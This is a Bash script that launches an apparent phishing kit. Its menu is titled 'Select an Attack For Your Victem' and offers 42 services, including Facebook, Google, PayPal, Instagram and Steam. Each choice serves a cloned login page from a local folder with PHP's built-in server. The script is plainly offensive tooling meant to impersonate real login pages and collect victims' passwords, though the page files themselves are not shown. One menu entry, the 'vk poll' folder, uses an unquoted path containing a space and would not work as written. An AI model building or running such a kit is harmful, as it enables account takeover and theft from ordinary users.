#!/bin/bash
clear
figlet Raj Rahi
echo "[-] Created by Raj"
echo "[::] Select an Attack For Your Victem [::] "
echo ""
echo "[1] Facebook         [11] Facebook Security        [21] Netflix          [31] Spotify"
echo "[2] Google           [12] Github                   [22] Origin           [32] Stackoverflow"
echo "[3] Google New       [13] Gitlab                   [23] Paypal           [33] Steam" 
echo "[4] Adobe            [14] Instagram followers      [24] Pinterest        [34] TikTok"
echo "[5] Badoo            [15] Instagram Verify         [25] PlayStation      [35] Twitch"
echo "[6] Deviantart       [16] Insta Followers          [26] Protonmail       [36] Twitter"
echo "[7] Discord          [17] Instagram                [27] Quora            [37] vk"
echo "[8] Dropbox          [18] Linkedin                 [28] reddit           [38] vk poll"
echo "[9] ebay             [19] Mediafire                [29] roblox           [39] Wordpress"
echo "[10] Messenger       [20] Microsoft                [30] Snapchat         [40] Xbox"
echo "                                                                         [41] Yahoo"
echo "[99] Exit                                                                [42] Yandex"
echo ""
read -p "[-] Select Your Number : " la
read -p "[-] Select Your Port : " la2
case $la in
1)
cd sites/facebook/
php -S 127.0.0.1:$la2
;;
2)
cd sites/google/
php -S 127.0.0.1:$la2
;;
3) 
cd sites/google_new/
php -S 127.0.0.1:$la2
;;
4)
cd sites/adobe/
php -S 127.0.0.1:$la2
;;
5)
cd sites/badoo/
php -S 127.0.0.1:$la2
;;
6)
cd sites/deviantart/
php -S 127.0.0.1:$la2
;;
7)
cd sites/discord/
php -S 127.0.0.1:$la2
;;
8)
cd sites/dropbox/
php -S 127.0.0.1:$la2
;;
9)
cd sites/ebay/
php -S 127.0.0.1:$la2
;;
10)
cd sites/fb_messenger/
php -S 127.0.0.1:$la2
;;
11)
cd sites/fb_security/
php -S 127.0.0.1:$la2
;;
12)
cd sites/github/
php -S 127.0.0.1:$la2
;;
13) 
cd sites/gitlab/
php -S 127.0.0.1:$la2
;;
14)
cd sites/ig_followers/
php -S 127.0.0.1:$la2
;;
15)
cd sites/ig_verify/
php -S 127.0.0.1:$la2
;;
16)
cd sites/insta_followers/
php -S 127.0.0.1:$la2
;;
17)
cd sites/instagram/
php -S 127.0.0.1:$la2
;;
18)
cd sites/linkedin/
php -S 127.0.0.1:$la2
;;
19)
cd sites/mediafire/
php -S 127.0.0.1:$la2
;;
20)
cd sites/microsoft/
php -S 127.0.0.1:$la2
;;
21)
cd sites/netflix/
php -S 127.0.0.1:$la2
;;
22)
cd sites/origin/
php -S 127.0.0.1:$la2
;;
23) 
cd sites/paypal/
php -S 127.0.0.1:$la2
;;
24)
cd sites/pinterest/
php -S 127.0.0.1:$la2
;;
25)
cd sites/playstation/
php -S 127.0.0.1:$la2
;;
26)
cd sites/protonmail/
php -S 127.0.0.1:$la2
;;
27)
cd sites/quora/
php -S 127.0.0.1:$la2
;;
28)
cd sites/reddit/
php -S 127.0.0.1:$la2
;;
29)
cd sites/roblox/
php -S 127.0.0.1:$la2
;;
30)
cd sites/snapchat/
php -S 127.0.0.1:$la2
;;
31)
cd sites/spotify/
php -S 127.0.0.1:$la2
;;
32)
cd sites/stackoverflow/
php -S 127.0.0.1:$la2
;;
33) 
cd sites/steam/
php -S 127.0.0.1:$la2
;;
34)
cd sites/tiktok/
php -S 127.0.0.1:$la2
;;
35)
cd sites/twitch/
php -S 127.0.0.1:$la2
;;
36)
cd sites/twitter/
php -S 127.0.0.1:$la2
;;
37)
cd sites/vk/
php -S 127.0.0.1:$la2
;;
38)
cd sites/vk poll/
php -S 127.0.0.1:$la2
;;
39)
cd sites/Wordpress/
php -S 127.0.0.1:$la2
;;
40)
cd sites/xbox/
php -S 127.0.0.1:$la2
;;
41)
cd sites/yahoo/
php -S 127.0.0.1:$la2
;;
42)
cd sites/Yandex/
php -S 127.0.0.1:$la2
;;
99)
exit 

esac

